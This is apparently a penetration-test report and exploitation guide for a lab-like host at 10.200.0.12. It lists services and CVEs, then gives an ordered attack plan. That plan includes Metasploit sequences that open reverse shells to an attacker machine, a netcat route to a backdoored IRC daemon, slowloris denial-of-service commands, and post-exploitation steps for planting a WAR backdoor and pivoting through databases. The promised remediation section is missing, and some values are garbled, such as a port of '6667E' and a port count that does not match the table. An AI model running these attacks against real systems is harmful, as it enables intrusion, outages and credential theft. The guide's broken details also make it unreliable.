refresh the brainhole

================================================================================
TARGET: 10.200.0.12 — Vulnerability Assessment & Exploitation Guide
SCAN DATE: 2026-06-13 19:22 EDT
SCANNER: Nmap 7.95 --script=vuln
SOURCE FILES: nmapweb10.200.0.12.md, CVE records, Metasploit module
================================================================================

TABLE OF CONTENTS
-----------------
1. Executive Summary
2. Open Ports & Services
3. Vulnerability Details (by priority)
4. Exploitation Steps
5. Additional Attack Vectors
6. Remediation Recommendations
7. References

================================================================================
1. EXECUTIVE SUMMARY
================================================================================

Target 10.200.0.12 is a legacy Ubuntu server running Apache 2.2.8 with Tomcat,
multiple databases (MySQL, PostgreSQL), Java RMI, IRC daemon, and numerous
legacy services. The host has CRITICAL vulnerabilities enabling remote code
execution, session hijacking, and denial of service.

RISK LEVEL: CRITICAL
- 3 exploitable RCE vectors identified
- Multiple cryptographic weaknesses across all TLS/SSL services
- Default/unauthenticated configurations on critical services
- 20+ open ports with minimal access controls

================================================================================
2. OPEN PORTS & SERVICES
================================================================================

PORT    STATE      SERVICE           NOTES
------  ---------  ----------------  ----------------------------------
21/tcp  filtered   ftp               Blocked by firewall
22/tcp  open       ssh               OpenSSH (no vuln detected)
23/tcp  open       telnet            Unencrypted remote access
25/tcp  open       smtp              Postfix + TLS (VULNERABLE)
53/tcp  open       domain            DNS service
80/tcp  open       http              Apache 2.2.8 + Tomcat (VULNERABLE)
111/tcp open       rpcbind           RPC services
139/tcp open       netbios-ssn       Samba/Windows file sharing
445/tcp open       microsoft-ds      SMB service
512/tcp open       exec              Unix execute service
513/tcp open       login             Unix rlogin service
514/tcp open       shell             Unix rsh service
1099/tcp open       rmiregistry       Java RMI (VULNERABLE - RCE)
1524/tcp open       ingreslock        Often bindshell
2049/tcp open       nfs               NFS file sharing
2121/tcp open       ccproxy-ftp       FTP proxy service
3306/tcp open       mysql             MySQL database (VULNERABLE)
5432/tcp open       postgresql        PostgreSQL (VULNERABLE)
5900/tcp open       vnc               VNC remote desktop
6000/tcp open       X11               X Window System
6667/tcp open       irc               UnrealIRCd (TROJANED)
8009/tcp open       ajp13             Tomcat AJP connector
8180/tcp open       http-alt          Tomcat webapp (VULNERABLE)

TOTAL OPEN PORTS: 24 (excluding filtered/closed)

================================================================================
3. VULNERABILITY DETAILS (BY PRIORITY)
================================================================================

PRIORITY 1 — CRITICAL: Remote Code Execution

---------------------------------------------------------------------------
VULN-01: Java RMI Insecure Default Configuration
---------------------------------------------------------------------------
CVE:        CVE-2011-3556
CVSS:       HIGH (RCE)
PORT:       1099/tcp (rmiregistry)
STATE:      VULNERABLE
SERVICE:    Java RMI Registry / RMI Activation

DESCRIPTION:
  The default configuration of the RMI Registry and RMI Activation services
  allows loading classes from any remote HTTP/HTTPS URL. Since RMI method
  calls do not require authentication, an attacker can force the remote JVM
  to load a malicious class, achieving arbitrary code execution.

  This exploit works against both rmiregistry and rmid, and most custom RMI
  endpoints. It does NOT work against JMX ports (unless another RMI endpoint
  is active in the same Java process).

IMPACT:
  Full remote code execution as the user running the Java process.

EXPLOITATION:
  Module: exploit/multi/misc/java_rmi_server
  Author: mihi
  Platform: java
  Arch: ARCH_JAVA
  
  Steps:
    msfconsole
    use exploit/multi/misc/java_rmi_server
    set RHOSTS 10.200.0.12
    set RPORT 1099
    set PAYLOAD java/meterpreter/reverse_tcp
    set LHOST <your-kali-ip>
    run

  Mechanism:
    1. Module connects to RMI registry and negotiates protocol
    2. Sends a crafted DGC (Distributed Garbage Collector) "clean()" call
       targeting interface sun.rmi.transport.DGCImpl_Stub
    3. The call includes a malicious JAR URL pointing to the attacker's
       HTTP server
    4. Remote JVM fetches and loads the JAR containing RMILoader.class and
       RMIPayload.class
    5. Payload executes, establishing reverse TCP connection back to attacker

  Metasploit module source:
    github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb

---------------------------------------------------------------------------
VULN-02: UnrealIRCd 3.2.8.1 Backdoor (Trojaned Release)
---------------------------------------------------------------------------
CVE:        None assigned (trojan)
PORT:       6667/tcp (irc)
STATE:      VULNERABLE — "Looks like trojaned version of unrealircd"
SERVICE:    UnrealIRCd 3.2.8.1

DESCRIPTION:
  The official UnrealIRCd 3.2.8.1 tarball was compromised in November 2009
  and distributed on mirrors until June 2012. A hidden backdoor was embedded
  in the source code via a DEBUG directive in include/struct.h.

  The backdoor accepts a hardcoded OPER password that grants full IRC operator
  privileges regardless of any configured access restrictions (including
  passworded server/hub restrictions). This allows the attacker to execute
  ANY command with the privileges of the user running the ircd process.

CHECK IF AFFECTED:
  grep DEBUG3_DOLOG_SYSTEM include/struct.h
  If it outputs two lines → RUNNING THE BACKDOORED VERSION

MD5 VERIFICATION:
  Backdoored (BAD):  752e46f2d873c1679fa99de3f52a274d
  Official (GOOD):   7b741e94e867c0a7370553fd01506c66

IMPACT:
  Full command execution as the IRC daemon user. Can lead to system compromise.

EXPLOITATION:
  Option A — Manual IRC connection:
    nc 10.200.0.12 6667
    # Issue OPER command with backdoor password (see advisory for details)

  Option B — Metasploit modulde:
    use exploit/linux/irc/unreal_ircd_3281_backdoor
    set RHOSTS 10.200.0.12
    set RPORT 6667E
    run

SOURCE:
  https://seclists.org/fulldisclosure/2010/Jun/277
  http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt

---------------------------------------------------------------------------
VULN-03: Apache Tomcat Manager (Authentication Bypass Potential)
---------------------------------------------------------------------------
CVE:        N/A (misconfiguration)
PORT:       8009/tcp (ajp13), 8180/tcp (http-alt)
STATE:      401 Unauthorized on /manager/html
SERVICE:    Apache Tomcat

DESCRIPTION:
  The Tomcat manager interface is accessible but requires authentication.
  If default credentials are used or if RMI exploitation provides access to
  the Java process, the manager can be used to deploy a WAR file for RCE.

EXPLOITATION PATH:
  1. Exploit RMI (VULN-01) to gain access to the Java process
  2. Access /manager/html with obtained credentials or session hijack
  3. Deploy malicious WAR file for persistent backdoor

================================================================================
PRIORITY 2 — HIGH: Cryptographic Vulnerabilities

---------------------------------------------------------------------------
VULN-04: SSL/TLS CCS Injection (ChangeCipherSpec)
---------------------------------------------------------------------------
CVE:        CVE-2014-0224
CVSS:       HIGH
PORTS:      25/tcp (smtp), 3306/tcp (mysql), 5432/tcp (postgresql)
STATE:      VULNERABLE — "No reply from server (TIMEOUT)" on CCS probe
RISK:       High

DESCRIPTION:
  OpenSSL versions before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before
  1.0.1h do not properly restrict processing of ChangeCipherSpec messages.
  An attacker can inject a forged CCS message during the TLS handshake to
  force use of a zero-length master key, hijacking sessions or obtaining
  sensitive information.

IMPACT:
  Man-in-the-middle session hijacking on all TLS-encrypted services.
  Can intercept database credentials, email data, and web session cookies.

EXPLOITATION:
  Metasploit DoS (denial of service via crash):
    use auxiliary/dos/ssl/openssl_ccs
    set RHOSTS 10.200.0.12
    set RPORT <target-port>
    run

  Manual MITM exploitation requires network position between client and server.
  Use sslstrip or custom TLS handshake manipulation.

REFERENCE:
  https://www.cve.org/CVERecord?id=CVE-2014-0224
  http://www.openssl.org/news/secadv_20140605.txt

---------------------------------------------------------------------------
VULN-05: SSL POODLE (Padding Oracle On Downgraded Legacy Encryption)
---------------------------------------------------------------------------
CVE:        CVE-2014-3566
CVSS:       MEDIUM-HIGH
PORTS:      25/tcp (smtp), 5432/tcp (postgresql)
STATE:      VULNERABLE

DESCRIPTION:
  SSL Protocol 3.0 uses nondeterministic CBC padding, making it easier for
  man-in-the-middle attackers to obtain cleartext data via a padding-oracle
  attack. The attacker can recover plaintext byte-by-byte from encrypted
  SSLv3 sessions.

IMPACT:
  Decryption of cookies, credentials, and other sensitive data sent over
  SSLv3 connections. Affects all services that fall back to SSLv3.

EXPLOITATION:
  Metasploit DoS:
    use auxiliary/dos/ssl/poodle
    set RHOSTS 10.200.0.12
    set RPORT <target-port>
    run

  Manual exploitation (byte-by-byte plaintext recovery):
    Reference: https://www.openssl.org/~bodo/ssl-poodle.pdf
    PoC:       https://github.com/mpgn/poodle-PoC

  Mitigation: Disable SSLv3, enforce TLS 1.2+ only.

REFERENCE:
  https://www.cve.org/CVERecord?id=CVE-2014-3566

---------------------------------------------------------------------------
VULN-06: Anonymous Diffie-Hellman Key Exchange (MitM)
---------------------------------------------------------------------------
CVE:        N/A (protocol weakness)
PORTS:      25/tcp (smtp), 5432/tcp (postgresql)
STATE:      VULNERABLE

DESCRIPTION:
  TLS services using anonymous Diffie-Hellman key exchange only provide
  protection against passive eavesdropping. Active man-in-the-middle attacks
  can completely compromise confidentiality and integrity of the session.

CHECK RESULTS FROM SCAN:
  Cipher Suite: TLS_DH_anon_WITH_RC4_128_MD5 (SMTP)
  Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA (PostgreSQL)
  Modulus Length: 1024-bit (weak)

IMPACT:
  Man-in-the-middle attacks on SMTP and PostgreSQL connections.

---------------------------------------------------------------------------
VULN-07: Weak DH Group (Logjam)
---------------------------------------------------------------------------
CVE:        CVE-2015-4000
PORTS:      25/tcp (smtp), 5432/tcp (postgresql)
STATE:      VULNERABLE

DESCRIPTION:
  Diffie-Hellman key exchange uses groups of insufficient strength. The
  EXPORT-GRADE DH Group 1 with 512-bit modulus is particularly weak and
  can be broken by state-level adversaries.

CHECK RESULTS FROM SCAN:
  EXPORT-GRADE DH GROUP 1 — 512-bit modulus (SMTP)
  WEAK DH GROUP 1 — 1024-bit modulus (PostgreSQL)

IMPACT:
  Potential decryption of past and future communications if private key is
  recovered. Weakens all TLS sessions on affected services.

REFERENCE:
  https://weakdh.org

================================================================================
PRIORITY 3 — MEDIUM: Denial of Service & Web Application Issues

---------------------------------------------------------------------------
VULN-08: Slowloris DOS Attack
---------------------------------------------------------------------------
CVE:        CVE-2007-6750
PORT:       80/tcp (http), 8180/tcp (http-alt)
STATE:      LIKELY VULNERABLE

DESCRIPTION:
  Apache HTTP Server 1.x and 2.x (before 2.2.15) lacks mod_reqtimeout,
  allowing remote attackers to cause denial of service via partial HTTP
  requests. The target runs Apache 2.2.8 — confirmed vulnerable.

MECHANISM:
  Attacker opens many connections and sends partial HTTP requests, holding
  them open with periodic data fragments. This starves the server's
  connection pool, preventing legitimate users from connecting.

IMPACT:
  Complete web service outage. All HTTP/HTTPS traffic disrupted.

EXPLOITATION:
  slowloris -s 10.200.0.12

  Metasploit:
    use auxiliary/dos/http/slowloris
    set RHOSTS 10.200.0.12
    set RPORT 80
    run

REFERENCE:
  https://www.cve.org/CVERecord?id=CVE-2007-6750
  http://ha.ckers.org/slowloris/

---------------------------------------------------------------------------
VULN-09: HTTP TRACE Enabled
---------------------------------------------------------------------------
CVE:        N/A (configuration issue)
PORT:       80/tcp
STATE:      TRACE is enabled

DESCRIPTION:
  The HTTP TRACE method is enabled on the web server. This can be used for
  Cross-Site Tracing (XST) attacks to steal credentials and cookies even
  when HttpOnly flags are set.

IMPACT:
  Session hijacking via XST attacks in combination with XSS vulnerabilities.

ACTION:
  Disable TRACE method in Apache configuration:
    TraceEnable off

---------------------------------------------------------------------------
VULN-10: Missing httponly Flag on JSESSIONID Cookies
---------------------------------------------------------------------------
PORT:       8180/tcp (Tomcat webapp)
PATHS:      /admin/*, /admin/view/javascript/fckeditor/*, etc.

DESCRIPTION:
  All JSESSIONID cookies across admin paths are missing the httponly flag.
  This allows JavaScript to read session cookies, enabling session hijacking
  via any XSS vulnerability on the same domain.

AFFECTED PATHS (partial list):
  /admin/
  /admin/index.html
  /admin/login.html
  /admin/admin.html
  /admin/account.html
  /admin/login.jsp
  /admin/admin.jsp
  /admin/controlpanel.jsp
  /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html
  /admin/includes/FCKeditor/editor/filemanager/upload/test.html
  /admin/jscript/upload.html

IMPACT:
  Session hijacking if any XSS vulnerability exists on the domain.

================================================================================
PRIORITY 4 — INFORMATIONAL: Directory & File Enumeration

---------------------------------------------------------------------------
VULN-11: Sensitive Paths Discovered via http-enum Script
---------------------------------------------------------------------------
PORT:       80/tcp

FINDINGS:
  /tikiwiki/          — Tikiwiki CMS installed
  /test/              — Test page (information disclosure)
  /phpinfo.php        — PHP info file (server configuration exposure)
  /phpMyAdmin/        — phpMyAdmin web interface (database admin)
  /doc/               — Directory listing enabled (Apache 2.2.8 Ubuntu DAV)
  /icons/             — Default Apache icons directory (listing enabled)
  /index/             — Potentially interesting folder
  /webdav/            — WebDAV directory (file upload potential)
  /manager/html       — Tomcat manager (401 Unauthorized)
  /admin/             — Possible admin folder with login pages

RISK:
  phpinfo.php exposes server configuration, PHP version, loaded modules.
  phpMyAdmin may have weak/default credentials.
  WebDAV may allow file upload if misconfigured.
  Directory listings expose internal file structure.

================================================================================
4. EXPLOITATION STEPS — RECOMMENDED ORDER
================================================================================

STEP 1: Java RMI Code Execution (Port 1099) — HIGHEST PRIORITY
---------------------------------------------------------------------------
Impact: Full remote code execution
Difficulty: Low (automated Metasploit module)
Risk of detection: Medium (unusual RMI traffic)

  msfconsole
  use exploit/multi/misc/java_rmi_server
  set RHOSTS 10.200.0.12
  set RPORT 1099
  set PAYLOAD java/meterpreter/reverse_tcp
  set LHOST <your-kali-ip>
  run

  Expected: Meterpreter session as Java process user

STEP 2: UnrealIRCd Backdoor (Port 6667) — EASIEST SHELL
---------------------------------------------------------------------------
Impact: Command execution as IRC daemon user
Difficulty: Low (known backdoor password)
Risk of detection: High (obvious malicious activity)

  nc 10.200.0.12 6667
  # Connect and issue OPER command with backdoor credentials
  
  OR
  
  use exploit/linux/irc/unreal_ircd_3281_backdoor
  set payload cmd/unix/reverse_netcat
  set RHOSTS 10.200.0.12
  set RPORT 6667
  run

STEP 3: CCS Injection — Session Hijack (Ports 25, 3306, 5432)
---------------------------------------------------------------------------
Impact: Intercept encrypted traffic
Difficulty: Medium (requires MITM position)
Risk of detection: High

  Requires network position between client and server.
  Use sslstrip or custom TLS manipulation tools.

STEP 4: POODLE Attack — Decrypt SSLv3 Traffic (Ports 25, 5432)
---------------------------------------------------------------------------
Impact: Byte-by-byte plaintext recovery
Difficulty: Medium-High
Risk of detection: Medium

  Reference: https://www.openssl.org/~bodo/ssl-poodle.pdf

STEP 5: Slowloris DoS — Web Service Disruption (Port 80)
---------------------------------------------------------------------------
Impact: Denial of service
Difficulty: Low
Risk of detection: High (obvious traffic pattern)

  slowloris -s 10.200.0.12

STEP 6: Post-Exploitation — Web Application Access
---------------------------------------------------------------------------
After gaining initial access via RMI or IRCd:

  a) Enumerate phpMyAdmin at /phpMyAdmin/ with obtained credentials
  b) Access Tomcat manager at /manager/html for WAR deployment
  c) Check WebDAV at /webdav/ for file upload capability
  d) Extract credentials from /tikiwiki/ database
  e) Pivot through MySQL (3306) and PostgreSQL (5432)

================================================================================
5. ADDITIONAL ATTACK VECTORS
================================================================================

PORT    SERVICE     POTENTIAL ATTACK VECTOR
------  ----------  --------------------------------------------------
22/tcp  SSH         Brute-force, version-specific exploits
23/tcp  Telnet      Unencrypted protocol — sniff credentials
111/tcp RPCbind     RPC enumeration, NFS exploitation
139/tcp NetBIOS     SMB enumeration, pass-the-hash
445/tcp SMB         EternalBlue (if Windows), SMB signing issues
512/tcp exec        rexec — remote command execution
513/tcp login     rlogin — authentication bypass
514/tcp shell     rsh — trust-based authentication abuse
1524/tcp ingreslock Often a bindshell — connect and test
2049/tcp NFS       NFS export enumeration, mount attacks
2121/tcp FTP        Credential brute-forcing, anonymous login